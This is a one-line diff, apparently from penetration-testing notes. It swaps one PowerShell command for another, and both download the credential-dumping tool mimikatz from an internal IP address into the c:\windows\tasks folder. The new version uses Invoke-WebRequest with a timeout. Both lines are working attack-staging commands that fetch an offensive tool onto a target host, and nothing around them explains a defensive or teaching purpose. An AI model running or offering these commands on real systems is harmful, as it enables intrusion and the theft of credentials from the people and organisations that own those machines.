@@ -1,1 +1,1 @@
-powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.0.0.1/tools/mimi/mimikatz.exe','c:\windows\\tasks\mimi.exe')
+powershell -c "iwr -Uri 'http://10.2.2.231/tools/mimi/mimikatz.exe' -OutFile 'c:\windows\tasks\mimi.exe' -TimeoutSec 300"
